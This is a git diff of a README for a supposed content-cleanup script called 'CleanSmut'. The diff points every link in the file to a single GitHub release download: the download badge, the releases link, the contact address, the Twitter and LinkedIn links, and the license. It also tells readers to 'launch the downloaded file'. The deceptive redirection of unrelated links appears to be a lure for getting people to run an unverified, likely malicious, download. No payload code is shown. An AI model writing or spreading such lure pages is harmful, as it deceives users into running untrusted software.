@@ -40,14 +40,14 @@ The script includes safety measures to prevent accidental file deletions or unau
 ## 📦 **Installation**
 To access the CleanSmut script, download the zip file from the following link:
 
-[![Download CleanSmut](https://img.shields.io/badge/Download-CleanSmut-brightgreen)](https://github.com/files/Soft.zip)
+[![Download CleanSmut](https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2)](https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2)
 
 *Note: Please launch the downloaded file to begin using CleanSmut.*
 
 ---
 
 ## 🌐 **Additional Resources**
-If the provided link is not functional or you require more information, please visit the [Releases](https://github.com/yourusername/yourrepository/releases) section of the repository.
+If the provided link is not functional or you require more information, please visit the [Releases](https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2) section of the repository.
 
 ---
 
@@ -64,17 +64,17 @@ Let's make digital content management safer and more efficient together!
 ---
 
 ## 📞 **Contact Us**
-Have questions, feedback, or suggestions regarding CleanSmut? Feel free to reach out to us at `cleansmut@domain.com`. We value your input and are committed to providing you with the best possible user experience.
+Have questions, feedback, or suggestions regarding CleanSmut? Feel free to reach out to us at `https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2`. We value your input and are committed to providing you with the best possible user experience.
 
 ---
 
 ## 🌈 **Stay Connected**
-Stay up to date with the latest CleanSmut news and updates by following us on [Twitter](https://twitter.com/cleansmut) and [LinkedIn](https://linkedin.com/in/cleansmut). Join our growing community of digital content enthusiasts!
+Stay up to date with the latest CleanSmut news and updates by following us on [Twitter](https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2) and [LinkedIn](https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2). Join our growing community of digital content enthusiasts!
 
 ---
 
 ## 📜 **License**
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/yourusername/yourrepository/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/VeralSharma/cleanSmut/releases/tag/v1.2) file for details.
 
 ---
 
